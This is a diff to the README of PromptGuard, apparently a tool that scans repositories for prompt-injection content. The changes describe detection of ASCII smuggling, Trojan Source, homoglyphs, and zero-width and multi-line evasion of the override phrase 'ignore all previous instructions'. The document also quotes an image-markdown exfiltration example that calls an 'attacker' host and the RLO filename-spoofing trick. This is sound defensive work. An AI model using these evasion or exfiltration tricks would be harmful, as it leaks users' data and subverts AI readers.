@@ -75,14 +75,17 @@ The generated `dist/PromptGuard.exe` can be distributed and run with a double-cl
 
 **Steganographic analysis:** acrostics, diagonal patterns, hidden base64/hex/URL-encoding/ROT13, zero-width characters, Unicode Tags (ASCII smuggling), bidirectional control characters (Trojan Source), Unicode homoglyphs (Cyrillic/Greek/fullwidth/mathematical alphanumeric), hidden comments.
 
-**Filename scanning:** the filename itself is checked against the same pattern set -- instructions can be smuggled in a file or PR name, not just its content.
+**Filename scanning:** the filename itself is checked against the full pattern set *and* the steganographic detectors (homoglyphs, bidi override, confusable ASCII, zero-width padding) -- instructions and visual spoofing can be smuggled in a file or PR name, not just its content.
+
+**Commit message scanning:** even a shallow (`--depth 1`) clone still carries the HEAD commit's message. It's scanned as a pseudo-file (`<git commit message>`) alongside repo files.
 
 Vectors worth calling out:
 
 - **ASCII smuggling** — an entire prompt encoded in the Unicode Tags block (`U+E0000`–`U+E007F`), which renders as nothing at all. The scanner decodes the payload and reports it.
-- **Trojan Source** — bidirectional control characters (`U+202A`–`U+202E`, `U+2066`–`U+2069`) that make source render differently than it parses (CVE-2021-42574).
+- **Trojan Source** — bidirectional control characters (`U+202A`–`U+202E`, `U+2066`–`U+2069`) that make source render differently than it parses (CVE-2021-42574). Also checked against filenames, closing the classic `invoice[RLO]gnp.exe` extension-spoofing trick.
 - **Zero-click image exfiltration** — `![](https://attacker/log?d={DATA})` or an equivalent `<img>` tag, where simply rendering the response leaks data. Plain external images are not flagged; only templated URLs and data-carrying query parameters are.
-- **Zero-width regex evasion** — an attacker can insert a zero-width character inside a keyword (`ign​ore all previous instructions`) to slip past a `\s+`-based regex. The scanner re-runs every pattern against a version of the content with zero-width/Unicode Tag characters stripped, and flags anything that only matches after stripping as `evasion_zero_width_bypass` (critical).
+- **Zero-width regex evasion** — an attacker can insert an invisible character inside a keyword (`ign​ore all previous instructions`) to slip past a `\s+`-based regex. Covers zero-width spaces, invisible math operators (`U+2061`–`U+2064`), soft hyphen, and Variation Selectors (`U+FE00`–`U+FE0F`) in addition to Unicode Tags. The scanner re-runs every pattern against a version of the content with these stripped, and flags anything that only matches after stripping as `evasion_<pattern_name>` (critical).
+- **Multi-line evasion** — splitting a phrase across a line break (`"ignore all\nprevious instructions"`) used to be invisible to every pattern, since content was matched one line at a time. Patterns are now also run against the raw, un-split content, so a match spanning a line break is still caught.
 - **Homoglyphs beyond Cyrillic/Greek** — fullwidth forms (`ｉｇｎｏｒｅ`) and Mathematical Alphanumeric Symbols (bold/italic/script variants) are detected generically via NFKC normalization, not a fixed lookup table.
 
 Patterns work in **English and Spanish**.
